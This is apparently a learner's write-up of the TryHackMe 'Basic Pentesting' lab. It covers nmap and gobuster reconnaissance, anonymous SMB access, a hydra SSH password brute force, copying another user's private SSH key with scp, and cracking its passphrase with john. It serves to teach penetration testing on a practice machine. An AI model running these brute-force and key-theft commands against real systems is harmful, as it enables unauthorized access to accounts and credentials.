# Basic Pentesting | TryHackMe
### 1. First, nmap to the target.

`nmap -sV 10.10.150.97`
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 13:17 JST
Nmap scan report for 10.10.150.97
Host is up (0.30s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3390/tcp filtered dsc
3517/tcp filtered 802-11-iapp
8009/tcp open     ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open     http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 300.35 seconds
```
### 2. http is available and I'm going to see it.

![picture](https://github.com/itc-n22003/new/blob/main/pictures/basic_pentesting_80.png)

I didn't find anything in particular.

### 3. I'll try gobuster.

`gobuster dir -w common.txt -u http://10.10.150.97`
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.150.97
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/n22003/Work/Wordlist/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/11 13:34:44 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/development          (Status: 301) [Size: 318] [--> http://10.10.150.97/development/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/05/11 13:37:09 Finished
===============================================================
```

### 4. I'll take a look at it since the `/development` is suspicious.
Found dev.txt and j.txt.
According to dev.txt, smb is free. (I knew this from nmap earlier...)

### 5. Take a look at the SMB.
```
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2
```
Check Anonymous.

### 6. I'll try to connect it to Anonymous.

`smbclient \\\\10.10.150.97\\Anonymous`
No passwords.
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Apr 20 02:31:20 2018
  ..                                  D        0  Fri Apr 20 02:13:06 2018
  staff.txt                           N      173  Fri Apr 20 02:29:55 2018

                14318640 blocks of size 1024. 11094400 blocks available
```
Take a look at staff.txt

`more staff.txt`

I found a user named Jan.

### 7. I'm going to try to do a total ssh hit on Jan with hydra.

`hydra -l jan -P rockyou.txt 10.10.150.97 ssh`

### 8. Now that I have jan's password, I'll try connecting via ssh.
There was nothing special in jan's directory.
However, there were some in kay's directory, so I tried ssh connection with kay.

### 9. Get kay key.
I'll try to see if I can get the kay key with scp.

`scp jan@10.10.150.97:/home/kay/.ssh/id_rsa .`

The password is jan's.
I got it and I'm going to feed it to john.

`ssh2john id_rsa > hash`

Analyze with john.

`john --wordlist=rockyou.txt hash`

Now that I know kay's password, I change id_rsa's permissions to 600 and ssh.

`chmod 600 id_rsa`

`ssh -i id_rsa kay@10.10.150.97`

The password is the one I just parsed.
If you can log in, check pass.bak and that's it.
